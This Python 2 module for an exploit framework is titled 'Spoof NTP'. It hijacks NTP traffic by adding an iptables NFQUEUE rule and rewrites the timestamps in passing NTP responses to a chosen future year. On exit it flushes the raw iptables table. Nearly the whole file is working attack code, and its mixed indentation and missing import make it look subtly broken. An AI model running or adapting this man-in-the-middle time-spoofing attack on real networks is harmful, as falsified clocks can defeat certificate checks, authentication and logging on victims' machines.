from Sploit import Sploit
from collections import OrderedDict

import os
import sys
import time
import argparse
import datetime
from netfilterqueue import NetfilterQueue

try:
        from scapy.all import IP,UDP,NTP
        conf.verb = 0
except ImportError:
        print('[!] Failed to import Scapy')
        sys.exit(1)

INFO = {}
INFO['NAME'] = "Spoof NTP"
INFO['DESCRIPTION'] = "Spoof NTP packets"
INFO['VENDOR'] = "--"
INFO['CVE Name'] = "--"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = "https://github.com/dm-ts/modulesEAST"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 14.02.20"
INFO['PATH'] = "/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["YEAR"] = 2037, dict(description = 'Year to go...')
#####################################################################
class exploit(Sploit):
	def __init__(self,year=2037,logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.year = year
		self.SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
		self.NTP_EPOCH = datetime.date(1900, 1, 1)
		self.NTP_DELTA = (self.SYSTEM_EPOCH - self.NTP_EPOCH).days * 24 * 3600
	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.year = self.args.get("YEAR", self.year)

	def ntp_system(self,date):
		return datetime.datetime.fromtimestamp(date-self.NTP_DELTA)
	def system_ntp(self,date):
		return date + self.NTP_DELTA
	def upgrade(self,dtime):
		new_time = datetime.datetime(self.year, dtime.month, dtime.day, dtime.hour, dtime.minute, dtime.second, dtime.microsecond)
        	return time.mktime(new_time.timetuple())

	def manipulate(self,package):
		pkt = IP(package.get_payload())
		udp = pkt.getlayer(UDP)
		del pkt.chksum
		del pkt.len
		del udp.chksum
		del udp.len
		if pkt.haslayer(NTP):
			ntp = pkt.getlayer(NTP)
		else:
			ntp = NTP(pkt.load)
		 # Timestamp to UTC time
		self.log("---------------------------------")
		self.log("[*] NTP packet:")
		self.log("---------------------------------")
		ref = self.ntp_system(ntp.ref)
		recv = self.ntp_system(ntp.recv)
		sent = self.ntp_system(ntp.sent)
		# Upgrade the year
		new_ref = self.upgrade(ref)
		new_recv = self.upgrade(recv)
		new_sent = self.upgrade(sent)
		# UTC time to timestamp
    		ntp.recv = self.system_ntp(new_recv)
    		ntp.sent = self.system_ntp(new_sent)
		ntp.ref = self.system_ntp(new_ref)
		package.set_payload(bytes(pkt))
		#self.log('Packet !')
		self.log("Reference Timestamp : ")
		self.log("\t"+str(ref)+' -> '+str(datetime.datetime.fromtimestamp(new_ref)))
		self.log("Receive Timestamp : ")
		self.log("\t"+str(recv)+' -> '+str(datetime.datetime.fromtimestamp(new_recv)))
		self.log("Transmit Timestamp : ")
		self.log("\t"+str(sent)+' -> '+str(datetime.datetime.fromtimestamp(new_sent)))
		package.accept()

	def run(self):
		self.args()
		self.log('Starting')
		######### MAIN CODE ###########
		# Iptables rule for NTP packets
		os.system('iptables -t raw -A PREROUTING -p udp --sport 123 -j NFQUEUE --queue-num 10')
		# Filter packets
		nfqueue = NetfilterQueue()
		# 10 is the iptables rule queue number
		nfqueue.bind(10, self.manipulate)
		try:
			self.log("[!] Waiting for NTP packages to spoof (Year = "+str(self.year)+" )")
			nfqueue.run()
		except Exception as e:
			self.log("[!] [FAIL] Failed to start NetFilterQueue : "+ e)
			sys.exit(1)
		finally:
			nfqueue.unbind()
			#p.terminate()
			os.system('iptables -F -vt raw')

		###############################
        	self.finish(True)


#####################################################################
if __name__ == '__main__':
    print"Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()

